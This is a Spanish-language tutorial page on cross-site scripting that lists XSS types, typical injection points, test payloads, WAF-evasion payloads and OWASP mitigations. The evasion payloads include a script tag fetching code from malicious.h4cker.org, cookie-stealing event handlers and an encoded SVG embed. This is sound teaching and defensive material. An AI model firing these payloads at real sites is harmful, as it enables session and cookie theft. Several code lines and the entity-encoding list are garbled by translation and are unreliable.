---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# XSS Injection

Encontrar las vulnerabilidades xss se logran mediante los siguientes tipos de ataques:

1. Reflejado (Reflected XSS)
2. Persistente (Stored XSS)
3. Basado en DOM (DOM-based XSS)

Normalmente encontrará vulnerabilidades XSS en la siguiente ubicaciones:

* Campos de búsqueda que hacen eco de una cadena de búsqueda al usuario
* encabezados HTTP
* Campos de entrada que reflejan los datos del usuario
* Mensajes de error que devuelven texto proporcionado por el usuario
* Campos ocultos que pueden incluir datos ingresados ​​por el usuario.
* Aplicaciones que muestran datos proporcionados por el usuario

esde la barra de direcciones de un navegador:

```
  javascript:alert("Prueba Omar_s_XSS"); javascript:alerta(documento.cookie);
```

El siguiente ejemplo muestra una prueba XSS que se puede realizar en un campo de entrada del usuario en un formulario web:

```
<script>alerta("Prueba XSS")</script>
```

&#x20;

**NOTA** Los atacantes pueden utilizar técnicas de ofuscación en ataques XSS codificando etiquetas o partes maliciosas del script usando Unicode para que el enlace o el contenido HTML quede disfrazado para el usuario final que navega por el sitio.

### XSS Evasion Techniques

Se pueden utilizar numerosas técnicas para evadir las protecciones XSS y los productos de seguridad, como los firewalls de aplicaciones web (WAF). En lugar de enumerar todas las diferentes técnicas de evasión descritas por OWASP, esta sección revisa algunas de las técnicas más populares.

Primero, echemos un vistazo a una inyección de JavaScript XSS que sería detectada por la mayoría de los filtros XSS y soluciones de seguridad:

```
<SCRIPT SRC=http://malicious.h4cker.org/xss.js></SCRIPT>
```

El siguiente ejemplo muestra cómo la etiqueta HTML **img** se puede utilizar de varias maneras para evadir potencialmente los filtros XSS:

```
  <img src="javascript:alert('xss');"> <img src=javascript:alert('xss')> <img src=javascript:alert("XSS")> <img src=javascript:alert ('xs')>
```

También es posible utilizar otras etiquetas HTML maliciosas (como etiquetas), como se demuestra aquí:

```
  <a onmouseover="alert(document.cookie)">Este es un enlace malicioso</a> <a onmouseover=alert(document.cookie)>Este es un enlace malicioso</a>
```

Un atacante también puede utilizar una combinación de referencias de caracteres HTML hexadecimales para evadir potencialmente los filtros XSS, como se demuestra aquí:

```
  <img src=javascript& #x3Aalert('XSS' x29>
```

La codificación US ASCII puede eludir muchos filtros de contenido y también puede usarse como técnica de evasión, pero solo funciona si el sistema transmite en codificación US ASCII o si se configura manualmente. Esta técnica es útil contra WAF. El siguiente ejemplo demuestra el uso de la codificación ASCII de EE. UU. para evadir WAF:

```
¼script¾alerta(¢XSS¢)¼/script¾
```

**El siguiente ejemplo muestra un ejemplo de una técnica de evasión que implica el uso de etiquetas de inserción** HTML para incrustar un archivo de gráficos vectoriales escalables (SVG):

```
  <EMBED SRC=”data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcm cvMjAwMC9zdmciIHhtbG5zOnhsa W5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3 hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaW dodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU 9InRleHQvZWNtYXNjcmlwdC I+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" tipo="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

Mitigaciones de XSS

Las siguientes son reglas generales para prevenir ataques XSS, según OWASP:

* Utilice un sistema de plantillas de escape automático.
* Nunca inserte datos que no sean de confianza, excepto en ubicaciones permitidas.
* Utilice el escape HTML antes de insertar datos que no sean de confianza en el contenido del elemento HTML.
* Utilice el escape de atributos antes de insertar datos que no sean de confianza en atributos comunes de HTML.
* Utilice el escape de JavaScript antes de insertar datos que no sean de confianza en valores de datos de JavaScript.
* Utilice el escape CSS y valide estrictamente antes de insertar datos que no sean de confianza en valores de propiedad de estilo HTML.
* Utilice el escape de URL antes de insertar datos que no sean de confianza en los valores de los parámetros de URL HTML.
* Desinfecte el marcado HTML con una biblioteca como ESAPI para proteger la aplicación subyacente.
* Evite el XSS basado en DOM siguiendo las recomendaciones de OWASP en [_https://cheatsheetseries.owasp.org/cheatsheets/DOM\_based\_XSS\_Prevention\_Cheat\_Sheet.html_ .](https://cheatsheetseries.owasp.org/cheatsheets/DOM\_based\_XSS\_Prevention\_Cheat\_Sheet.html)
* Utilice el indicador de cookies **HTTPOnly** .
* Implementar política de seguridad de contenidos.
* Utilice el encabezado de respuesta **X-XSS-Protection** .

También debe convertir la entrada que no sea de confianza en un formato seguro, donde la entrada se muestra como datos para el usuario. Esto evita que la entrada se ejecute como código en el navegador. Para hacer esto, realice la siguiente codificación de entidad HTML:

* Convertir _**a**_ `**&amp;.` \*\* \_
* Convertir _**<**_ a `**&lt;**.`
* Convertir _**>**_ a `**&gt;.`\*\*
* Convertir a _**\*\***_ `**&quot;.` \_
* Convertir a _**\*\***_ `**&#x27;.` \_
* Convertir _**a**_ `**&#x2F;.` \*\* \_

Las siguientes son mejores prácticas adicionales para prevenir ataques XSS:

* Escapa todos los caracteres (incluidos los espacios pero excluyendo los caracteres alfanuméricos) con la entidad HTML **\&#xHH;** formato (donde **HH** es un valor hexadecimal).
* Utilice únicamente la codificación de URL, no la URL completa ni los fragmentos de ruta de una URL, para codificar los valores de los parámetros.
* Escapa todos los caracteres (excepto los caracteres alfanuméricos), con el formato de escape **\uXXXX Unicode (donde X** es un número entero).
* El escape CSS admite **\XX** y **\XXXXXX** , así que agregue un espacio después del escape CSS o use la cantidad total de escape CSS posible rellenando con ceros el valor.
* Eduque a los usuarios sobre la navegación segura para reducir el riesgo de ser víctimas de ataques XSS.

Los controles XSS ahora están disponibles en los navegadores web modernos.

**NOTA** Uno de los mejores recursos que enumera varias mitigaciones contra vulnerabilidades y ataques XSS es la hoja de trucos de prevención de secuencias de comandos entre sitios de OWASP, disponible en [_https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html_](https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html) .
